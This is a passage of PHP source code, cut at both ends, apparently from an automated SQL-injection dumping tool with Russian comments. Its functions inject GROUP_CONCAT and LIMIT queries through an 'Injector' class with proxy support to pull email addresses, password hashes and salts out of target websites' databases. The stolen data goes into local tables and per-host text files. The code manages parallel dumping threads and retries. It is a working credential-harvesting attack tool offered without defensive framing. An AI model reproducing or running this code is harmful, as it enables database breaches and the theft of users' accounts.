			
			
			
			$this->d($mysql,'multi pass one');
			
			
			if(trim($mysql[$mail['Filed']['label']])!=='')
			{
				
				if(!isset($mysql[$pass_f]))
				{
					$pass = '';
				}else
				{
					$pass = trim($mysql[$pass_f]);
				}
				
				
				if(!isset($mysql[$salt_new]))
				{
					$sss_salt = '';
				}else
				{
					$sss_salt = trim($mysql[$salt_new]);
				}
				
				
				
				if($pass == '')
				{
					$this->emp_pass++;
				}
				
				
				if($this->emp_pass > $this->pass_empty  and $this->up == false)
				{
					$this->logs('$this->emp_pass > 125:'.$this->r,__FUNCTION__);
					$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
					
					$this->Post->query("UPDATE  `multis` SET  `prich` = 'emp_pass > 175 pass pustie'  WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
					
					return 'vpizdu';
				}
				
				
				
				if($this->salt == true)
				{
					echo  $mysql[$mail['Filed']['label']].':'.$mysql[$pass_f].':'.$mysql[$salt_new]."<br/>";
				}else{
					echo  $mysql[$mail['Filed']['label']].':'.$mysql[$pass_f]."<br/>";
					
				}
				
				
				
				if($this->sliv_pass_save==true){
					
					
					if($this->salt == true)
					{
						fwrite($fh, $mysql[$mail['Filed']['label']].':'.$mysql[$pass_f].':'.$mysql[$salt_new]."\n");
					}else{
						fwrite($fh, $mysql[$mail['Filed']['label']].':'.$mysql[$pass_f]."\n");
						
					}	
					
					
				}
				$ht = $this->hashtype($mysql[$pass_f]);
				if($ht != 1)
				{
					$this->hashtype = $ht;
				}else{
					$this->hashtype = '0';
				}
				
				
				@$key0 = array_search($pass, $this->stopword);
				
				
				if($key0 === FALSE AND strlen($pass) > 2 AND $pass !='null')
				{

					$pass2 = $mysql[$pass];
					
					preg_match('/\\A(?:^([a-z0-9][a-z0-9_\\-\\.\\+]*)@([a-z0-9][a-z0-9\\.\\-]{0,63}\\.([a-z]{2,4}))$)\\z/i',$mysql[$mail['Filed']['label']],$z);
					
					if($z[0] !='')//если строка мыло нормальное
					{
						$m = explode('@',$z[0]);
						
						@$key = array_search($pass2, $tmp);
						@$key2 = array_search(strlen($pass2), array_slice($this->tmp2, count($this->tmp2)-1));
						@$key3 = array_search($mysql[$mail['Filed']['label']], $tmp3);
						
						//сравниваем мыла
						@$key5 = array_search(strlen($z[0]), array_slice($this->tmp5, count($this->tmp5)-1));
						$this->tmp5[] = strlen($z[0]);
						
						
						$this->tmp2[] = strlen($pass2);
						$tmp[]  = $pass2;
						$tmp3[] = $mysql[$mail['Filed']['label']];
						
						
						$this->d(array_slice($this->tmp2, count($this->tmp2)-1),'slice');
						$this->d(strlen($pass2),'strlen');
						
						if($this->hashtype == '0')
						{
							$this->d($this->hashtype,'hash');
							
							
							//проверяем какой нить маленьких хэш по количеству символов
							if($key2 !== FALSE AND $this->k < 6)
							{
								$this->l2++;
								//$this->d($this->l2,'буква L2');
								
								//$this->d($this->tmp2,'tmp2');
								if($this->l2 > 7)
								{
									$this->hashtype = 'unkown';
								}
								
							}else{
								$this->k++;
							}
						}
						//если 35 подряд мыл есть одинаковых тогда выходим
						if($key5 !== FALSE)
						{
							$this->l5++;
							$this->d($this->l5,'буква L5');
							
							
							if($this->l5 > $this->dlina  and $this->up == false)
							{
								$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
								
								$this->Post->query("UPDATE  `multis` SET  `prich`='function this->l5 > $this->dlina mnogo odinakovih'  WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
								
								return 'vpizdu';
							}
							
						}else{
							$this->l5--;
						}
						
						
							if($this->salt == true)
							{
								
								$kkk = $mysql[$pass].":".$mysql[$salt_new];
								$this->Post->query("INSERT INTO mails (`email`,`pass`,`date`,`domen`,`hashtype`,`bd`,`zona`,`meiler`) VALUES('{$mysql[$mail[Filed][label]]}','{$kkk}',now(),'{$url[host]}','{$this->hashtype}','{$bd[1]}','{$zone}','{$m[1]}')");
							}else{
								$this->Post->query("INSERT INTO mails (`email`,`pass`,`date`,`domen`,`hashtype`,`bd`,`zona`,`meiler`) VALUES('{$mysql[$mail[Filed][label]]}','{$mysql[$pass]}',now(),'{$url[host]}','{$this->hashtype}','{$bd[1]}','{$zone}','{$m[1]}')");
								
							}
						
							
							
							
							echo 'OK<br>';
							
						
					}
				}	
				else
				{
					$null++;	
					if($null == $this->null_count)
					{
						echo 'Много пустых или null';
						$this->logs('Mnogo null vpizdu:'.$this->r,__FUNCTION__);
						
						$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
						
						$this->Post->query("UPDATE  `multis` SET  `prich`='function Mnogo null vpizdu $this->null_count'  WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
						
						
						return 'vpizdu';
					}
					
				}
				
				flush();
				$hunta=0;	
			}else
			{
				$hunta = $hunta+1;
				echo $hunta.'<br>';
			}


			if($hunta==$this->hunta)
			{
				fclose($fh);
				$this->logs('$hunta = 20 vpizdu:'.$this->r,__FUNCTION__);
				$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
				
				$this->Post->query("UPDATE  `multis` SET  `prich`='function hunta vashe vibrat ne mojet LIMIT $this->hunta'  WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
				
				return 'vpizdu';
			}		
		}
		
		
		$this->Post->query("UPDATE  `multis` SET  `get` = 2 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
		
		if($this->sliv_pass_save==true){
			fclose($fh);
		}
		return ;//	die();
	}
	
	function slivMulti($id=0){//слив емайлов без паролей через group concat --Mysql--
		
        if(!isset($this->raznica_dump) or $this->raznica_dump=='')$this->raznica_dump=60;
        
		$settings['potok_one']  = $this->potok_one;
		$settings['dump_one_good'] = $this->dump_one_good;
		$settings['dump_one'] = $this->dump_one;
		$settings['check_url'] = $this->check_url;
		$settings['potok'] = $this->potok;
		$settings['pass']= $this->pass;
		
		$mail = $this->Filed->findbyid($id);
		
		$filed_id = $mail['Filed']['id'];
		$this->logs($filed_id.'-$filed_id:'.$this->r,__FUNCTION__);
		
		$squle = $this->Post->query("SELECT * FROM  `posts` WHERE `id` = ".$mail['Filed']['post_id']." limit 0,1");
		
		
	
		
		if(count($squle)==0)
		{
			
			$this->d($squle,'$squle BAD');
			
			$data = $this->Post->query("UPDATE  `fileds` SET  `get` =  '2', `multi` = 2 WHERE  `post_id` = ".$mail['Filed']['post_id']);
			
			$this->d('squle pusto  zavershaem !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!',"UPDATE  `fileds` SET  `get` =  '2', `multi` = 2 WHERE  `post_id` = ".$mail['Filed']['post_id']);
			
			return 'vpizdu';
		}else{
			
				$this->d($squle,'$squle GOOD');
		}
	
		
		
		///используется ли sleep
		if(strlen($squle[0]['posts']['sleep']) > 2)
		{
			$this->d($set,'SET emailS');
			$set = $squle[0]['posts']['sleep'];
		}else
		{
			$set = false;
		}
		
		
		
		///////общие данные из выборки////////
		$bd = explode(':', $mail['Filed']['ipbase']);//все бд
		$count = $mail['Filed']['count'];//всего
		$ff = intval($mail['Filed']['lastlimit']);//откуда начинать
		if($ff=='')$ff=0;
		
		
		
		//инициируем первоначальные параметры
		$this->mysqlInj = new $this->Injector();
		
		$this->proxyCheck();
		
		$this->mysqlInj ->inject($squle[0]['posts']['header'].'::'.$squle[0]['posts']['gurl'],$squle[0],$set);
		
		
		
		
		/////выбираем возможную инфу о уже существующих потоках ЗАПУЩЕННЫХ или УЖЕ ЗАВЕРЕШННЫХ/////
		$multi = $this->Post->query("SELECT count(*) FROM  `multis` WHERE `filed_id` = ".$mail['Filed']['id']." AND `get` !=0");
		
		
		////расчёт среднего количества для дампинга
		$tmpCount = $count-$mail['Filed']['lastlimit'];//количество которое нам надо сдампить! минус lastlimit
		$oneCount = $tmpCount/$settings['potok']; //сколько должно дампится за один раз c учётом потоков
		
		
		$shag = $this->shag;//по сколько за раз будет дампится штук записей
		$zapr  = round($oneCount/$shag);//количество итераций для одного потока
		if($zapr==0)$zapr=1;
		
		////логирование////
		//$this->d($multis,'$multis');
		$this->d($zapr,'zapr pervuy');
		$this->d($oneCount.' oneCount perviy');
		
		$this->logs($zapr.' zapr perviy:'.$this->r,__FUNCTION__);
		$this->logs($oneCount.' oneCount perviy:'.$this->r,__FUNCTION__);
		
		flush();
		
		//////потоков нету, это первый////////
		if($multi[0][0]['count(*)'] == 0)
		{
			///если меньше 5000 то больше к filed_id не обращается и дампим всё без деления на потоки////
			if($count < $this->potok_dump_one)
			{
				$shag=$shag-10;
			
				$oneCount = $count;
				$zapr  = round($oneCount/$shag);
				
				///логирование
				$this->d($zapr,'$zapr 5000');
				$this->logs($zapr.' $zapr 5000:'.$this->r,__FUNCTION__);
				
				
				$this->Post->query("UPDATE  `fileds` SET  `get` =  '2', `multi` = 2 WHERE  `id` =".$filed_id);
			}
			
			$potok = 1;
			
			//по сути если нуль ff, значит потоки еще не начинались, иначе первый lastlimit1 = ff будет
			if($ff == 0)
			{
				$start = 0;
			}else
			{
				$start = $ff;
			}
			
			
			//если нету уже в базе данных, тогда вставляем инфу о потоке
			$numPotok = $this->Post->query("SELECT count(*) FROM  `multis` WHERE `potok` = ".$potok." AND `filed_id`=".$filed_id);
			
			$this->d($numPotok,'$numPotok');
			
			if($numPotok[0][0]['count(*)'] == 0)
			{
				$f = __FUNCTION__;
				
				
				$this->d('pervyu potok !!!!!!!!!');
				
				$post_id = $squle[0]['posts']['id'];
				
				$squle[0]['posts']['url'] = str_replace('http://','',$squle[0]['posts']['url']);
				$squle[0]['posts']['url'] = 'http://'.$squle[0]['posts']['url'];
				
				$h2 = parse_url($squle[0]['posts']['url']);
				$domen = $h2['host'];
				
				//$date = date('Y-m-d h:i:s');
				$date = time();
				
				$tmpCount1 = $oneCount+$start;
				$this->Post->query("INSERT INTO `multis` (`filed_id`,`lastlimit`,`count`,`get`,`potok`,`isp`,`post_id`,`domen`,`date`,`pid`) VALUES({$filed_id},{$start},{$tmpCount1},1,{$potok},'{$f}',{$post_id},'{$domen}','{$date}',{$this->pid})");
				
				$this->d("INSERT INTO `multis` (`filed_id`,`lastlimit`,`count`,`get`,`potok`,`isp`,`post_id`,`domen`,`date`,`pid`) VALUES({$filed_id},{$start},{$tmpCount1},1,{$potok},'{$f}',{$post_id},'{$domen}','{$date}',{$this->pid})");
				
				$this->Post->query("UPDATE  `starts` SET  `potok` = {$potok} WHERE  `time_start` =".$this->timeStart);
				
			}
		}else
		{//если уже есть потоки тогда вычисляет значения следующего
			
			///ставим статус 2, где было уже 2 попытки
			$zav0 = $this->Post->query("SELECT * FROM  `multis` WHERE `get` = 3 AND `dok` = 1 AND `filed_id`=".$filed_id." limit 1");
			
			$this->d("SELECT * FROM  `multis` WHERE `get` = 3 AND `dok` = 1 AND `filed_id`=".$filed_id." limit 1",'zav0 zapro');
			$this->d($zav0,'ставим статус 2, где было уже 3 попытки');
			
			
			
			if($zav0[0]['multis']['get'] == 3)
			{
				$this->d('ku zav0');
				$this->d('$zav0 result $zav0[0][multis][get] == 3');
				if($this->Post->query("UPDATE  `multis` SET  `get` =  2 WHERE  `potok` = ".$zav0[0]['multis']['potok']." AND `filed_id`=".$filed_id)){
					
					$this->d('update kuZav uspeshno');
				}else{
					
					$this->d("UPDATE  `multis` SET  `get` =  2 WHERE  `potok` = ".$zav0[0]['multis']['potok']." AND `filed_id`=".$filed_id,'OK');
				}
				return 'vpizdu';
			}
			
			$this->d('ku1');
			
			/////проверка на перезапуск, не больше двух попыток////
			$zav = $this->Post->query("SELECT * FROM  `multis` WHERE `get`=3 AND `dok` < 1 AND `filed_id`=".$filed_id." limit 1");

			if($zav[0]['multis']['get'] == 3)
			{
				$dok = $zav[0]['multis']['dok']+1;
				$this->d($zav,'zav');
				$this->Post->query("UPDATE  `multis` SET  `get` =  1,`dok`=".$dok." WHERE  `potok` = ".$zav[0]['multis']['potok']." AND `filed_id`=".$filed_id);
				$this->Post->query("UPDATE  `starts` SET  `potok` = ".$zav[0]['multis']['potok']." WHERE  `time_start` =".$this->timeStart);
				
				$start =$zav[0]['multis']['lastlimit'];
				$oneCount =$zav[0]['multis']['count']; 
				$potok = $zav[0]['multis']['potok'];
				
				
				$shag = $shag-10;
				
				$oneCount = $oneCount -$start;
				$zapr  = round($oneCount/$shag);
				$this->d($zapr,'$zapr get 3');
				
				
			}else
			{
				$this->d('ku2');
				/////система расчёта добавления нового потока/////
				$allPotok = $multi[0][0]['count(*)'];
				
				//выбираем инфу о последнем потоке, даже если он завершен
				$next = $this->Post->query("SELECT * FROM  `multis` WHERE `potok` = ".$allPotok." AND `filed_id`=".$filed_id);
				
				//логи
				$this->d($allPotok,'$allPotok');
				$this->d($next,'$next - infa o poslednem potoke');
				
				$start = 	$next[0]['multis']['count'];
				$oneCount = $next[0]['multis']['count']+ $oneCount;
				$oneCount=$oneCount-10;
				
				$potok =  	$next[0]['multis']['potok']+ 1;
				
				if($oneCount > $count)
				{
					/////логирование/////
					$this->d("$oneCount > $count  : oneCount > count");
					$oneCount = $count-100;
					$start = $start -100;
					
					if($potok >= 6 )
					{
						$potok = 6;
						$this->d('potok > 6 oneCount > count SLIV');
						
						
						//$this->d("UPDATE  `multis` SET  `get` = 2 WHERE  `potok`=".$allPotok." AND `filed_id`=".$filed_id,'$oneCount > $count');
						//if($this->Post->query("UPDATE  `multis` SET  `get` = 2 WHERE  `potok`=".$allPotok." AND `filed_id`=".$filed_id))
						//{
						//$this->d('YES update potok > 6 oneCount > count sliv prosto');
						//}else{
						
						//$this->d('NE HOCHET');
						//}
						
						
						if($this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$allPotok." AND `filed_id`=".$filed_id)){
							
							$this->d("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$allPotok." AND `filed_id`=".$filed_id);
							$this->d('YES update potok > 6 oneCount > count sliv prosto');
						}
						
						
						return 'vpizdu';
					}
				}
				
				
				
				////Если уже 6 штук есть потоков в таблице, то oneCount будет больше чем count, если не так то:
				if($oneCount < $count)
				{
					///если сумма потоков меньше или равно чем в настройках, то добавляем поток
					if($multi[0][0]['count(*)'] < $settings['potok'])
					{
						
						//если нету уже в базе данных, тогда вставляем инфу о потоке
						$numPotok = $this->Post->query("SELECT count(*) FROM  `multis` WHERE `potok` = ".$potok." AND `filed_id`=".$filed_id);
						
						if($numPotok[0][0]['count(*)'] == 0)
						{
							$f = __FUNCTION__;
							
							$post_id = $squle[0]['posts']['id'];
							$squle[0]['posts']['url'] = str_replace('http://','',$squle[0]['posts']['url']);
							$squle[0]['posts']['url'] = 'http://'.$squle[0]['posts']['url'];
							$h2 = parse_url($squle[0]['posts']['url']);
							$domen = $h2['host'];
							//$date = date('Y-m-d h:i:s');
							$date = time();
							if($this->Post->query("INSERT INTO `multis` (`filed_id`,`lastlimit`,`count`,`get`,`potok`,`isp`,`post_id`,`domen`,`date`,`pid`) VALUES({$filed_id},{$start},{$oneCount},1,{$potok},'{$f}',{$post_id},'{$domen}','{$date}',{$this->pid})"))
							{
								$this->d($potok.' $potok YES insert zapis');
								$this->logs($potok.' - potok; YES insert zapis:'.$this->r,__FUNCTION__);
							}else
							{
								$this->d($potok.' $potok NO!!!! insert zapis');
								$this->logs($potok.' - potok;NO!!! insert zapis:'.$this->r,__FUNCTION__);
							}
							
							$this->Post->query("UPDATE  `starts` SET  potok = {$potok} WHERE  `time_start` =".$this->timeStart);
						}else{
							
							
							
							$this->d("SELECT count(*) FROM  `multis` WHERE `potok` = ".$potok." AND `filed_id`=".$filed_id,'EST UJE POTOK TAKOY!!!');
							$this->d($numPotok,'$numPotok');
							
							$this->d('POTOK UJE EST v multis status get=3 stavim slivmulti');
							$this->logs('POTOK UJE EST v multis status get=3 stavim slivmulti'.$this->r,__FUNCTION__);
							$this->d("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id`=".$filed_id);
							$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id`=".$filed_id);
							return 'vpizdu';
							
						}
					}else
					{
						$this->d('$multis[0][0][count(*)] <= $settings[potok]');
						$this->logs('$multis[0][0][count(*)] <= $settings[potok]:'.$this->r,__FUNCTION__);
						if($potok >6 )
						{
							$potok = 6;
							$this->d('potok > 6');
						}
						$this->d("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id`=".$filed_id);
						$this->logs("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id`=".$filed_id.':'.$this->r,__FUNCTION__);
						$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id`=".$filed_id);
						return 'vpizdu';
						
					}
				}
			}
			
			
		}
		
		
		$squle[0]['posts']['url'] = str_replace('http://','',$squle[0]['posts']['url']);
		$squle[0]['posts']['url'] = 'http://'.$squle[0]['posts']['url'];	
		
		$url = parse_url($squle[0]['posts']['url']);				
		$zone = explode('.', $url['host']);
		$zone = $zone[count($zone)-1];
		
		if($this->sliv_save==true){
			$filename = "./sliv_save/".$url['host'].".txt";
			$fh = fopen($filename, "a+");
			
		}
		
		
		///определение дублей нулов////
		$d=0;
		$time = time();
		$this->l2 = 0;
		$this->tmp2 = array();
		$this->k = 0;
		$this->emp = 0;
		$this->key300=0;
		$this->email_gavno =0;
		
		
		///логирование
		$this->logs($url['host'].' '.$zapr.'-zapr poslednyi:'.$this->r,__FUNCTION__);
		$this->logs($url['host'].' '.$oneCount.'-oneCount:'.$this->r,__FUNCTION__);
		$this->logs($url['host'].' '.$count.'-count:'.$this->r,__FUNCTION__);
		$this->logs($url['host'].' '.$start.'-start:'.$this->r,__FUNCTION__);
		$this->logs($url['host'].' '.$potok.'-potok:'.$this->r,__FUNCTION__);
		
		$this->d($zapr.'-zapr poslednyi:'.$this->r);
		$this->d(round($oneCount).'-oneCount:'.$this->r);
		$this->d($count.'-count:'.$this->r);
		$this->d($start.'-start:'.$this->r);
		$this->d($potok.'-potok:'.$this->r);
		flush();

		//exit;
		for ($i=0;$i<$zapr;$i++)
		{
			echo $i.'-i<br>';
			////определение зависания потока
			$this->workup();
			$new = time();
			$razn = $new-$time;

            
             
            
            
            
			if($razn>$this->raznica_dump)
			{
				$this->d($razn.'-razn slivMulti > 25:'.$this->r);
				$this->logs($url['host'].' '.$razn.'-razn slivMulti > 25:'.$this->r,__FUNCTION__);
				$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id`=".$filed_id);
				$this->Post->query("UPDATE  `multis` SET  `prich` = 'razn slivMulti > 25'  WHERE  `potok`=".$potok." AND `filed_id`=".$filed_id);
				
				//$this->stop();
				//$pid  = getmypid();
				//exec("kill -9 ".$pid);
				return 'vpizdu';
			}
			
			$time = time();
			
			
			
			$d++;
			$this->Post->query("UPDATE  `multis` SET  `lastlimit` = $start,`date` = $time,`pid`={$this->pid} WHERE  `potok`=".$potok." AND `filed_id`=".$filed_id);
			
			
			

			
			$mysql = $this->mysqlInj->mysqlGetValue('', '(SELECT '.$mail['Filed']['label'].' FROM '.$bd[1].'.`'.$mail['Filed']['table'].'` WHERE `'.$mail['Filed']['label'].'` LIKE char('.$this->charcher('%@%').') LIMIT '.$start.','.$shag.')t ', 'GROUP_CONCAT(t.'.$mail['Filed']['label'].')',0,array());
			
			$start2 = $start;
			
			$start = $start + $shag;
			
			$this->d($mysql,'mysql');
			
			
			
			if($i==0 AND !isset($mysql['GROUP_CONCAT(t.'.$mail['Filed']['label'].')']))
			{
				$shag_new = $shag-10;
				$mysql_new = $this->mysqlInj->mysqlGetValue('', '(SELECT '.$mail['Filed']['label'].' FROM '.$bd[1].'.`'.$mail['Filed']['table'].'` WHERE `'.$mail['Filed']['label'].'` LIKE char('.$this->charcher('%@%').') LIMIT '.$start.','.$shag_new.')t ', 'GROUP_CONCAT(t.'.$mail['Filed']['label'].')',0,array());
				
				$this->d($mysql_new,'$mysql_new');
				
				if(isset($mysql_new['GROUP_CONCAT(t.'.$mail['Filed']['label'].')']))
				{
					
					$this->d('shag nado menshe');
					$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
					$this->Post->query("UPDATE  `multis` SET  `prich` = 'UMENSHEN SHAG - minus 10'  WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
					return 'vpizdu';
				}
				
			}	
			
			//echo 123;exit;
			
			

			if($i==0 AND !isset($mysql['GROUP_CONCAT(t.'.$mail['Filed']['label'].')']))
			{
				
				$this->d('slivoneMulti ->>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>');
				if($this->sliv_save==true){
					fclose($fh);
				}
				$this->Post->query("UPDATE  `multis` SET  `function` = 1 WHERE  `potok` =$potok AND `filed_id`=".$filed_id);
				$this->d('function = 1:'.$this->r);
				$this->logs($url['host'].' function = 1:'.$this->r,__FUNCTION__);
				if($this->slivoneMulti($id,$potok,$start2,$oneCount)=='vpizdu')return 'vpizdu';

				return ;
			}
			
			flush();
			
			if($mysql['GROUP_CONCAT(t.'.$mail['Filed']['label'].')']!=='')
			{
				$mails = explode(',', $mysql['GROUP_CONCAT(t.'.$mail['Filed']['label'].')']);
				
				$tmp = array();
				$tmp3 = array();
				foreach ($mails as $value)
				{
					if($this->sliv_save==true){
						if(trim($value)!=='')fwrite($fh, trim($value)."\n");
			
					}
					
					
					
					
					preg_match('/\\A(?:^([a-z0-9][a-z0-9_\\-\\.\\+]*)@([a-z0-9][a-z0-9\\.\\-]{0,63}\\.([a-z]{2,4}))$)\\z/i',$value,$z);
					
					if($z[0] !='')//если строка мыло нормальное
					{	
						
						@$key = array_search($z[0], $tmp);
						
						@$key2 = array_search(strlen($z[0]), array_slice($this->tmp2, count($this->tmp2)-1));
						
						
						
						$this->tmp2[] = strlen($z[0]);
						$tmp[] = $z[0];
						
						//$this->d($key2,'key2');
						
						
						if($key === FALSE)
						{
							$this->key300++;
							
							if($this->up ==true)
							{
								if($this->key300 == 3300)
								{
									$tmp = array();
								}
							}else
							{
								if($this->key300 == 300)
								{
									$tmp = array();
								}
							}
							
							
							
							echo $value."<br>";
							
							$m = explode('@',$z[0]);
							
							if($key2 !== FALSE )
							{
								$this->l2++;
								$this->d($this->l2,'l2');
								

								if($this->up == true)
								{
									
									if($this->l2 > 10000 and $this->up == false)
									{
										$this->d($this->l2,'vpizdu 10000 ');
										$this->logs($url['host'].' $this->l2 vpizdu 10000 :'.$this->r,__FUNCTION__);
										$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id`=".$filed_id);
										
										$this->Post->query("UPDATE  `multis` SET  `prich` = '10000 sliv multis this->l2 vpizdu po dline mnogo pohojih'  WHERE  `potok`=".$potok." AND `filed_id`=".$filed_id);
										
										return "vpizdu";
									}
								}else
								{
									if($this->l2 > 40 and $this->up == false)
									{
										$this->d($this->l2,'vpizdu');
										$this->logs($url['host'].' $this->l2 vpizdu 40:'.$this->r,__FUNCTION__);
										$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id`=".$filed_id);
										
										$this->Post->query("UPDATE  `multis` SET  `prich` = 'sliv multis this->l2 vpizdu po dline mnogo pohojih 40'  WHERE  `potok`=".$potok." AND `filed_id`=".$filed_id);
										
										return "vpizdu";
									}
								}

								
								
								
								
							}else{
								$this->l2--;
							}
							
							$this->Post->query("INSERT INTO `mails_one` (`email`,`pass`,`date`,`domen`,`hashtype`,`bd`,`zona`,`meiler`) VALUES('{$z[0]}','0',now(),'{$url[host]}','0','{$bd[1]}','{$zone}','{$m[1]}')");
						}else
						{
							$l++;
							
							
								if($l == $this->dlina  and $this->up == false)
								{
									$this->logs($url['host'].' multiSliv odinakovie $l == 5500:'.$this->r,__FUNCTION__);
									$this->d('multiSliv odinakovie $l == 5500:');
									
									$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id`=".$filed_id);
									
									$this->Post->query("UPDATE  `multis` SET  `prich` = 'multiSliv odinakovie l == 100'  WHERE  `potok`=".$potok." AND `filed_id`=".$filed_id);
									
									return 'vpizdu';
								}	
							
							
							
							
							
							
							
							//echo $key.'<br>';
						}
					}else
					{
						$this->email_gavno++;

						
							if($this->email_gavno == $this->email_bad  and $this->up == false)
							{
								$this->d('Mnogo email_gavno '.$this->email_bad);
								$this->logs($url['host'].' Mnogo email_gavno slivConcat:'.$this->email_bad,__FUNCTION__);
								$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id`=".$filed_id);
								$this->Post->query("UPDATE  `multis` SET  `prich` = 'Mnogo email_gavno slivConcat $this->email_bad'  WHERE  `potok`=".$potok." AND `filed_id`=".$filed_id);
								
								return 'vpizdu';
							}
						
					}
				}
			}else
			{
				$this->emp++;
				if($this->emp == $this->hunta  and $this->up == false){
					$this->d($this->emp ,'$this->hunta = 105 vpizdu');
					$this->logs($url['host'].' '.$this->hunta.' $this->emp = 25vpizdu:'.$this->r,__FUNCTION__);
					$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id`=".$filed_id);
					
					$this->Post->query("UPDATE  `multis` SET  `prich` = 'sliv multis $this->hunta vashe ne vibralos'  WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
					
					return "vpizdu";
					
				}
			}			
		}
		if($this->sliv_save==true){
		fclose($fh);
		}
		$this->d('thanks za skachku');
		
		$this->Post->query("UPDATE  `multis` SET  `get` = 2 WHERE  `potok`=".$potok." AND `filed_id`=".$filed_id);
		
		
		
	}
	
	function slivoneMulti($id,$potok = 1,$lastlimit = 0,$oneCount=0){//слив через  лимит без паролей --MYSQL--
		
         if(!isset($this->raznica_dump) or $this->raznica_dump=='')$this->raznica_dump=60;
        
		$settings['potok_one']  = $this->potok_one;
		$settings['dump_one_good'] = $this->dump_one_good;
		$settings['dump_one'] = $this->dump_one;
		$settings['check_url'] = $this->check_url;
		$settings['potok'] = $this->potok;
		$settings['pass']= $this->pass;
		
		
		$hunta= 1;
		$mail =  $this->Filed->findbyid($id);
		
		$filed_id = $mail['Filed']['id'];
		
		$squle = $this->Post->query("SELECT * FROM `posts` WHERE `id` = ".$mail['Filed']['post_id']." limit 0,1");

		
		
		if(strlen($squle[0]['posts']['sleep']) > 2)
		{
			$set = $squle[0]['posts']['sleep'];
			$this->d($set,'SET email odin');
		}else
		{
			$set = false;
		}
		
		
		
		//инициируем первоначальные параметры
		$this->mysqlInj = new $this->Injector();
		
		$this->proxyCheck();
		$this->mysqlInj ->inject($squle[0]['posts']['header'].'::'.$squle[0]['posts']['gurl'],$squle[0],$set);
		
		//общие данные из выборки
		$bd = explode(':', $mail['Filed']['ipbase']);//все бд
		$count = $mail['Filed']['count'];
		
		
		$squle[0]['posts']['url'] = str_replace('http://','',$squle[0]['posts']['url']);
		$squle[0]['posts']['url'] = 'http://'.$squle[0]['posts']['url'];
		
		$url = parse_url($squle[0]['posts']['url']);
		$zone = explode('.', $url['host']);
		$zone = $zone[count($zone)-1];
		
		if($this->sliv_save==true){
		$filename = "./sliv_save/".$url['host'].".txt";
		$fh = fopen($filename, "a+");
		}
		
		
		$time = time();
		$tmp = array();
		$tmp3 = array();
		$this->l2 = 0;
		$this->tmp2 = array();
		$this->k = 0;
		
		///логирование
		$this->logs($lastlimit.'-function lastlimit:'.$this->r,__FUNCTION__);
		$this->logs($oneCount.'-function oneCount:'.$this->r,__FUNCTION__);
		$this->logs($potok.'-function potok:'.$this->r,__FUNCTION__);
		$this->logs(ceil ($lastlimit+$oneCount).'-function lastlimit+oneCount:'.$this->r,__FUNCTION__);
		
		
		for ($i=$lastlimit;$i<ceil($lastlimit+$oneCount);$i++)
		{
			
			$this->workup();
			
            
           
            
			$new = time();
			$razn = $new-$time;
			if($razn>$this->raznica_dump){
				
				$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id`=".$filed_id );
				$this->logs($razn.' raznfunction > 25:'.$this->r,__FUNCTION__);
				$this->d($razn,' raznfunction > 25: '.$this->r);
				
				$this->Post->query("UPDATE  `multis` SET  `prich` = 'slivOneMulti raznfunction > 25'  WHERE  `potok`=".$potok." AND `filed_id`=".$filed_id);
				
				return 'vpizdu';}
			
			$time = time();
			
			$this->Post->query("UPDATE  `multis` SET  `lastlimit` = $start,`date`=$time,`pid`={$this->pid} WHERE  `potok`=".$potok." AND `filed_id`=".$filed_id);
			
			$mysql = $this->mysqlInj->mysqlGetValue($bd[1],$mail['Filed']['table'], $mail['Filed']['label'], $i,array(),' WHERE `'.$mail['Filed']['label'].'` LIKE char('.$this->charcher('%@%').')');
			
			
			if(trim($mysql[$mail['Filed']['label']])!=='')
			{
				if($this->sliv_save==true){
					fwrite($fh, trim($mysql[$mail['Filed']['label']])."\n");
				}
				preg_match('/\\A(?:^([a-z0-9][a-z0-9_\\-\\.\\+]*)@([a-z0-9][a-z0-9\\.\\-]{0,63}\\.([a-z]{2,4}))$)\\z/i',$value,$z);
				
				if($z[0] !='')//если строка мыло нормальное
				{	
					
					@$key = array_search($z[0], $tmp);
					$tmp[] = $z[0];
					
					@$key2 = array_search(strlen($z[0]), array_slice($this->tmp2, count($this->tmp2)-1));
					
					
					
					if($key === FALSE)
					{	
						echo $z[0]."<br>";
						$m = explode('@',$z[0]);
						
						
						if($key2 !== FALSE )
						{
							$this->l2++;
